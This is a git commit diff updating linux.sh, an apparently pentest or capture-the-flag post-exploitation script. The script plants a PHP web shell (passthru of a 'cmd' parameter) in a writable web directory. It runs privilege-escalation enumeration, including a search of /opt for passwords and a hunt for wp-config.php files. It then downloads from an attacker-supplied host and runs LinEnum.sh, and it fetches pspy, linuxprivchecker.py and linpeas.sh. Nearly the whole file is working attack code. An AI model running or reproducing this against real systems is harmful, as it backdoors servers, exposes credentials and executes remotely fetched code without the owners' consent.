10570dc23aa2e2594cfaed2c881c32130a859fb4
3therk1ll <richardcurteis@users.noreply.github.com>
2019-11-13 09:29:20 +0000

    Update linux.sh

--- linux.sh
+++ linux.sh
@@ -2,44 +2,63 @@
 
 if [ -z "$1" ]
   then
-    echo "Host Required"
-    exit
+	echo "Host Required"
+	exit
 fi
 
+# Install PHP backdoor in web root
+backdoor()
+{
 echo "#### Backdoor Install Attempt ####\n"
 echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
+}
 
-echo "#### Sudoers ####\n"
+# Run quick enum commands
+commands()
+{
+echo "\n#### Sudoers ####\n"
 sudo -l
 
-echo "#### Kernel ####\n"
+echo "\n#### Kernel ####\n"
 uname -a
 
-echo "#### SUID Files ####\n"
+echo "\n#### SUID Files ####\n"
 find / -type f -perm -4000 2>/dev/null
 
-echo "#### Passwords in /opt?? ####\n"
+echo "\n#### Passwords in /opt?? ####\n"
 grep -iRl password /opt/*
 
-echo "#### Check /opt ####\n"
+echo "\n#### Check /opt ####\n"
 ls -la /opt
 
-echo "#### Any wp-config.php files? ####\n"
+echo "\n#### Any wp-config.php files? ####\n"
 find / -name wp-config.php 2>/dev/null
 
 if [ -z "$2" ]
   then
-	echo "#### Files Owned by User: $2 ####\n"
-    find / -user $2 2>/dev/null
+	echo "\n#### Files Owned by User: $2 ####\n"
+	find / -user $2 2>/dev/null
 fi
 
-echo "#### Processes ####\n"
-ps aux
 
-echo "#### Download and Run LinEnum.sh ####\n"
+
+echo "\n#### Processes ####\n"
+ps aux
+}
+
+# Download enumeration scripts and binaries
+downloads() {
+echo "\n#### Download and Run LinEnum.sh ####\n"
 wget $1/LinEnum.sh
 bash LinEnum.sh -r report.txt
 
-echo "#### Downloading psspy ####\n"
+echo "\n#### Downloading psspy ####\n"
 wget $1/psspy
+
+echo "\n#### Downloading linux-priv-checker ####\n"
+wget $1/linuxprivchecker.py
+
+echo "\n#### Downloading linpeas.sh ####\n"
+wget $1/linpeas.sh
+}
 
